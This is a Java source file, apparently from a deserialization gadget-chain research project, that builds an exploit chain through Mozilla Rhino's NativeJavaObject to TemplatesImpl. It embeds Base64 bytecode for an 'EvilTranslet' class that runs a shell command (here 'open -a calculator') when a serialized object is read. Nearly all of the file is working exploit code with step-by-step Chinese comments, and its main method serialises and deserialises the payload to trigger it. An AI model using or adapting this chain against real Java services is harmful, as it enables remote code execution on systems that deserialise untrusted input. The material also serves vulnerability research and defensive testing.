package com.trganda.gadget.rhino;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.trganda.gadget.utils.Reflections;

import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Hashtable;
import java.util.Map;

public class MozillaRhinoExec {

    static Method method;

    static {
        try {
            method =
                    MozillaRhinoExec.class.getMethod(
                            "customWriteAdapterObject", Object.class, ObjectOutputStream.class);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }

    public static Object getContextObject() throws Exception {
        // 创建一个 ScriptableObject 对象，用于设置 NativeJavaObject 的成员 prototype
        // 此 ScriptableObject 对象的成员 associatedValues 是一个 Hashtable 对象，需要包含 key 值 "ClassCache"。
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        // 创建第一个 GetterSlot 调用 `Context#enter` 方法，第三个参数设置为 4，创建的才会是 GetterSlot
        ScriptableObject scriptableObject = new Environment();
        Object nameSlot =
                Reflections.getMethod(
                                ScriptableObject.class,
                                "getSlot",
                                String.class,
                                int.class,
                                int.class)
                        .invoke(scriptableObject, "foo", 0, 4);

        // 设定动态调用的方法为 Context#enter
        Method enterMethod = Reflections.getMethod(Context.class, "enter");

        // 创建 MemberBox
        Class<?> memberBoxErrorClass = Class.forName("org.mozilla.javascript.MemberBox");
        Object memberBox = Reflections.createWithoutConstructor(memberBoxErrorClass);
        Reflections.getMethod(memberBoxErrorClass, "init", Method.class)
                .invoke(memberBox, enterMethod);
        Reflections.setFieldValue(nameSlot, "getter", memberBox);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "javaObject", scriptableObject);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Method method =
                MozillaRhinoExec.class.getMethod(
                        "customWriteAdapterObject", Object.class, ObjectOutputStream.class);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject", method);
        Reflections.setFieldValue(nativeJavaObject, "prototype", dummyScope);

        // parent 不能为 null，因为 NativeJavaObject#readObject 中，javaObject =
        // adapter_readAdapterObject.invoke(null, args); 成功返回后会调用 initMembers();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);

        return nativeJavaObject;
    }

    public static Object getObject() throws Exception {
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        Environment env = new Environment();
        Object messageSlot =
                Reflections.getMethod(
                                ScriptableObject.class,
                                "getSlot",
                                String.class,
                                int.class,
                                int.class)
                        .invoke(env, "yy", 0, 4);

        // 设定动态调用的方法为 TemplatesImpl#newTransformer
        Method templateMethod = Reflections.getMethod(TemplatesImpl.class, "newTransformer");

        // 创建 NativeJavaMethod
        NativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, "templates");
        Reflections.setFieldValue(messageSlot, "getter", transformerJavaMethod);

        // 创建 NativeJavaObject
        NativeJavaObject nativeJavaObject =
                new NativeJavaObject(dummyScope, templatesImpl(), TemplatesImpl.class);
        Reflections.setFieldValue(env, "prototypeObject", nativeJavaObject);

        NativeJavaObject outer = new NativeJavaObject();
        Reflections.setFieldValue(outer, "javaObject", env);
        Reflections.setFieldValue(outer, "isAdapter", true);
        Reflections.setFieldValue(outer, "adapter_writeAdapterObject", method);
        Reflections.setFieldValue(outer, "prototype", dummyScope);

        Reflections.setFieldValue(env, "parentScopeObject", getContextObject());

        return outer;
    }

    // 仅用于测试，不可用
    public static Object getObjectTest() throws Exception {
        // 创建一个 ScriptableObject 对象，用于设置 NativeJavaObject 的成员 prototype
        // 此 ScriptableObject 对象的成员 associatedValues 是一个 Hashtable 对象，需要包含 key 值 "ClassCache"。
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        // 创建第一个 GetterSlot 调用 `Context#enter` 方法，第三个参数设置为 4，创建的才会是 GetterSlot
        ScriptableObject scriptableObject = new Environment();
        Object nameSlot =
                Reflections.getMethod(
                                ScriptableObject.class,
                                "getSlot",
                                String.class,
                                int.class,
                                int.class)
                        .invoke(scriptableObject, "foo", 0, 4);

        // 设定动态调用的方法为 Context#enter
        Method enterMethod = Reflections.getMethod(Context.class, "enter");

        // 创建 MemberBox
        Class<?> memberBoxErrorClass = Class.forName("org.mozilla.javascript.MemberBox");
        Object memberBox = Reflections.createWithoutConstructor(memberBoxErrorClass);
        Reflections.getMethod(memberBoxErrorClass, "init", Method.class)
                .invoke(memberBox, enterMethod);
        Reflections.setFieldValue(nameSlot, "getter", memberBox);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "javaObject", scriptableObject);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Method method =
                MozillaRhinoExec.class.getMethod(
                        "customWriteAdapterObject", Object.class, ObjectOutputStream.class);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject", method);
        Reflections.setFieldValue(nativeJavaObject, "prototype", dummyScope);

        // 第二个 Slot
        Object messageSlot =
                Reflections.getMethod(
                                ScriptableObject.class,
                                "getSlot",
                                String.class,
                                int.class,
                                int.class)
                        .invoke(scriptableObject, "yy", 0, 4);
        // 设定动态调用的方法为 TemplatesImpl#newTransformer
        Method templateMethod = Reflections.getMethod(TemplatesImpl.class, "newTransformer");

        // 创建 NativeJavaMethod
        NativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, "templates");
        Reflections.setFieldValue(messageSlot, "getter", transformerJavaMethod);

        Context context = Context.enter();
        NativeObject parent = (NativeObject) context.initStandardObjects();
        NativeJavaObject inner = new NativeJavaObject(parent, templatesImpl(), TemplatesImpl.class);
        Reflections.setFieldValue(scriptableObject, "prototypeObject", inner);

        NativeJavaObject outer = new NativeJavaObject();
        Reflections.setFieldValue(outer, "javaObject", scriptableObject);
        Reflections.setFieldValue(outer, "isAdapter", true);
        Reflections.setFieldValue(outer, "adapter_writeAdapterObject", method);
        Reflections.setFieldValue(outer, "prototype", dummyScope);

        return outer;
    }

    public static Object templatesImpl() throws Exception {
        // TemplatesImpl 利用链
        TemplatesImpl templatesImpl = new TemplatesImpl();
        Reflections.setFieldValue(templatesImpl, "_name", "evil");
        Reflections.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        byte[] code =
                Base64.getDecoder()
                        .decode(
                                "yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==");
        Reflections.setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});

        return templatesImpl;
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out)
            throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        // 写入成员 javaObject
        out.writeObject(javaObject);
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream oos =
                new ObjectOutputStream(
                        Files.newOutputStream(Paths.get("target/MozillaRhinoExec.bin")));
        oos.writeObject(getObject());

        ObjectInputStream ois =
                new ObjectInputStream(
                        Files.newInputStream(Paths.get("target/MozillaRhinoExec.bin")));
        ois.readObject();
    }
}
